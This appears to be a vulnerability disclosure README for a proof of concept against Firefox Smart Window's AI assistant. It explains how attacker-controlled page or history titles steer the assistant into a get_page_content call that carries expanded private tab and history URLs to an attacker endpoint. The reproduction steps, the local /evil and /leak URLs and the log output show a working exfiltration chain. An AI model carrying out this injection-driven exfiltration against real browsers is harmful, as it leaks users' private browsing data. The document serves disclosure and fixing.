# Firefox Smart Window Private URL Exfiltration PoC

This folder contains a local OpenAI-compatible endpoint and writeup for a Firefox Smart Window privacy boundary failure validated against Firefox `152.0.2` on Windows.

Smart Window's `get_open_tabs` and `search_browsing_history` tools return private browser state and URL tokens to the assistant conversation. The tool implementations mark the conversation as containing private data, but the tab and history paths do not also mark the conversation as containing untrusted input. An attacker-controlled page title or history title can therefore influence the assistant into calling `get_page_content` on an attacker URL that embeds Firefox URL tokens. Firefox expands those URL tokens inside the attacker-controlled URL before dispatching the tool call. `get_page_content` blocks external fetches only when both private-data and untrusted-input state are already present, so the private-only state permits a browser-originated HTTP request that carries expanded private tab or history URLs.

## Tested Target

- Firefox `152.0.2` x64 for Windows
- Smart Window with a custom OpenAI-compatible endpoint
- Node.js `18+`
- Local validation endpoint: `http://127.0.0.1:8765/v1`

## Impact

An attacker who can place a malicious title into the user's open tabs or browsing history can cause Smart Window to send private browser URLs to an attacker-controlled HTTP endpoint through a hidden `get_page_content` fetch. The leaked URL can include sensitive path and query-string data such as search terms, document identifiers, account paths, invitation links, reset links, or application-specific one-time values.

The confirmed variants are:

- open-tab URL exfiltration through `get_open_tabs`;
- recent-history URL exfiltration through `search_browsing_history`;
- multi-token URL exfiltration, bounded by the tool limits;
- private metadata transfer for tab/history titles and history metadata through the same allowed `get_page_content` call.

Firefox limits the affected tool output to `15` open tabs and `15` history rows per tool call.

## Root Cause

The issue is a mismatch between Smart Window's security-state tracking and its tool argument rewriting.

1. `get_open_tabs` and `search_browsing_history` expose private browser data to the assistant.
2. Both tools add returned URLs to the conversation URL-token map.
3. Both tools set `privateData`.
4. Neither tool sets `untrustedInput` for attacker-controlled webpage metadata such as titles.
5. `ChatUtils.expandUrlTokensInToolParams()` performs token replacement inside arbitrary string tool parameters.
6. `Chat.sys.mjs` expands model-supplied tool-call arguments before dispatch.
7. `get_page_content` allows an arbitrary `http:` or `https:` fetch unless both `privateData` and `untrustedInput` are already set.

The resulting state is:

```text
privateData = true
untrustedInput = false
get_page_content attacker URL = allowed
URL tokens inside attacker URL = expanded before fetch
```

## Source Trace

Relevant Firefox `152.0.2` source locations:

| File | Location | Behavior |
| --- | ---: | --- |
| `browser/app/profile/firefox.js` | `2252-2268` | Smart Window API key, endpoint, model, first-run, and semantic-history prefs |
| `browser/components/aiwindow/models/Tools.sys.mjs` | `66` | `MAX_TABS = 15` |
| `browser/components/aiwindow/models/Tools.sys.mjs` | `94` | `MAX_HISTORY_RESULTS = 15` |
| `browser/components/aiwindow/models/Tools.sys.mjs` | `379-425` | `get_open_tabs` collects tabs, sets `privateData`, and adds URLs to the token map |
| `browser/components/aiwindow/models/Tools.sys.mjs` | `437-476` | `search_browsing_history` returns history rows, adds URLs to the token map, and sets `privateData` |
| `browser/components/aiwindow/models/Tools.sys.mjs` | `783-948` | `get_page_content` checks URL allowability and sets both flags only after content extraction |
| `browser/components/aiwindow/models/Tools.sys.mjs` | `989` | `get_user_memories` also sets `privateData`, indicating a sibling pattern worth reviewing |
| `browser/components/aiwindow/models/ChatUtils.sys.mjs` | `310` | `expandUrlTokensInToolParams()` expands URL tokens in tool parameters |
| `browser/components/aiwindow/models/ChatUtils.sys.mjs` | `385` | `replaceUrlsWithTokens()` replaces private URLs before model delivery |
| `browser/components/aiwindow/models/Chat.sys.mjs` | `415` | Serialized assistant tool-call arguments are rewritten through URL-token expansion |
| `browser/components/aiwindow/models/Chat.sys.mjs` | `449` | Tool parameters are rewritten through URL-token expansion before tool dispatch |
| `browser/components/aiwindow/models/SecurityProperties.sys.mjs` | `24-32` | Sticky `privateData` and `untrustedInput` state setters |
| `browser/components/aiwindow/models/tests/xpcshell/test_Tools_GetOpenTabs.js` | `242-253` | Existing test expectation: open tabs set private data while untrusted input remains false |
| `browser/components/aiwindow/models/tests/xpcshell/test_Tools_SearchBrowsingHistory.js` | `298` | Existing test expectation: browsing history has the same private-only state |
| `browser/components/aiwindow/models/tests/xpcshell/test_Tools_GetPageContent.js` | `444` | Existing coverage blocks `get_page_content` only after both flags are present |

## Product Reachability

Smart Window is a documented Firefox desktop feature. Mozilla documents Smart Window as a beta Firefox window with an assistant that can use tabs and browsing history, model selection, and a custom endpoint path.

Product and source reachability details:

- `browser.smartwindow.enabled` defaults to `false` in profile defaults.
- `AIWindow.launchWindow()` can set `browser.smartwindow.enabled=true` when Smart Window is launched and the feature is available.
- `AboutWelcomeDefaults.sys.mjs` sets `browser.smartwindow.enabled=true` for the `smart_window` attribution campaign.
- Smart Window preferences expose custom endpoint, API key, model, first-run state, and account/consent state.
- The settings tests accept `localhost` as a valid custom endpoint.

Reference pages:

- `https://support.mozilla.org/en-US/kb/smart-window`
- `https://support.mozilla.org/en-US/kb/smart-window-models`
- `https://support.mozilla.org/en-US/kb/smart-window-byom`
- `https://support.mozilla.org/en-US/kb/smart-window-safety`

## PoC Design

`poc/smartwindow_poc_server.js` is a dependency-free Node.js HTTP server that acts as a local OpenAI-compatible chat-completions endpoint.

The server performs a deterministic tool-call sequence:

1. If the user asks about history, request `search_browsing_history`.
2. Otherwise request `get_open_tabs`.
3. Extract Firefox URL tokens from the private tool result returned to the model endpoint.
4. Call `get_page_content` on `http://127.0.0.1:8765/leak`.
5. Place up to `15` URL tokens into `u0`, `u1`, `u2`, and following query parameters.
6. Place compact tab/history metadata into a `meta` query parameter.
7. Log whether Firefox expanded the URL tokens before requesting `/leak`.

The server uses a per-process run ID, so old log files do not cause false success messages in a fresh run.

## Run

Start the local endpoint:

```powershell
npm run poc
```

The server prints:

```text
Smart Window PoC endpoint: http://127.0.0.1:8765/v1
Open PoC tab: http://127.0.0.1:8765/evil
Logs: http://127.0.0.1:8765/logs
```

Reset current-run logs:

```powershell
curl http://127.0.0.1:8765/reset
```

Configure Smart Window to use the local endpoint. The same values can be set through the Smart Window custom model UI or through `about:config`:

```text
browser.smartwindow.enabled = true
browser.ai.control.smartWindow = enabled
browser.smartwindow.firstrun.hasCompleted = true
browser.smartwindow.firstrun.modelChoice = 0
browser.smartwindow.apiKey = poc
browser.smartwindow.model = smartwindow-poc
browser.smartwindow.endpoint = http://127.0.0.1:8765/v1
browser.smartwindow.preferences.endpoint = http://127.0.0.1:8765/v1
browser.smartwindow.tos.consentTime = 1770830464
```

## Open-Tab Reproduction

Open this page in a normal Firefox tab:

```text
http://127.0.0.1:8765/evil?secret=https%3A%2F%2Fbank.example%2Faccount%3Fsession%3Dsecret-token
```

Open a Smart Window and ask:

```text
What tabs do I have open?
```

Open the logs:

```text
http://127.0.0.1:8765/logs
```

Successful output contains a leak entry similar to:

```json
{
  "source": "tabs",
  "expandedPrivateUrl": "http://127.0.0.1:8765/evil?secret=https://bank.example/account?session=secret-token",
  "expandedPrivateUrls": {
    "u0": "http://127.0.0.1:8765/evil?secret=https://bank.example/account?session=secret-token"
  },
  "leakedParameterNames": ["u0"],
  "expanded": true,
  "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0"
}
```

## Browsing-History Reproduction

Use a profile with normal browsing history, open a Smart Window, and ask:

```text
Show my recent browsing history
```

Open:

```text
http://127.0.0.1:8765/logs
```

Successful output contains:

```json
{
  "source": "history",
  "expandedPrivateUrl": "https://www.google.com/search?client=firefox-b-1-d&q=Show+me+my+recent+browser+history",
  "leakedParameterNames": ["u0"],
  "privateMetadataSummary": {
    "kind": "history",
    "count": 15,
    "fields": ["title", "url", "visitDate", "visitCount", "relevanceScore"]
  },
  "expanded": true
}
```

## Confirmed Evidence

Installed Firefox `152.0.2` open-tab run:

```json
{
  "at": "2026-06-24T09:35:13.676Z",
  "path": "/leak?u=http://127.0.0.1:8765/evil?secret=https%3A%2F%2Fbank.example%2Faccount%3Fsession%3Dsecret-token",
  "expandedPrivateUrl": "http://127.0.0.1:8765/evil?secret=https://bank.example/account?session=secret-token",
  "expanded": true,
  "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0"
}
```

Installed Firefox `152.0.2` history run:

```json
{
  "historyResultsReturned": 15,
  "leakPath": "/leak?source=history&u=https://www.google.com/search?client=firefox-b-1-d&q=Show+me+my+recent+browser+history",
  "expanded": true,
  "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0"
}
```

## Security Boundary

The intended Smart Window boundary is that private browser state and untrusted webpage content should constrain later assistant actions. The vulnerable state transition leaves the conversation marked private-only after tab/history tools, so the later `get_page_content` network fetch is still available.

The security impact is the second-hop browser request: webpage-controlled metadata can drive a later browser tool call that sends private URL-token-expanded data to an attacker-controlled URL outside the configured model endpoint.

## Fix Direction

- Mark tab titles, history titles, and similar webpage-derived metadata as untrusted.
- Set `untrustedInput` in `get_open_tabs` when returning webpage-controlled titles.
- Set `untrustedInput` in `search_browsing_history` when returning webpage-controlled titles and history metadata.
- Block `get_page_content` when `privateData` is true unless the destination is an exact user-mentioned URL or a narrowly allowed browser-owned URL.
- Require URL tokens to be the complete URL parameter value or complete tool parameter value before expansion.
- Disallow URL-token expansion as a substring inside attacker-selected URLs.
- Add regression tests for `get_open_tabs -> get_page_content` and `search_browsing_history -> get_page_content` with private-only state.
- Add regression tests for multiple URL tokens in one tool argument string.

## Validation Status

Local source review and installed-browser testing confirm the open-tab and browsing-history variants in Firefox `152.0.2`. The included server reproduces the browser-side guard failure with a deterministic local endpoint and records whether Firefox expanded private URL tokens before issuing the `/leak` request.
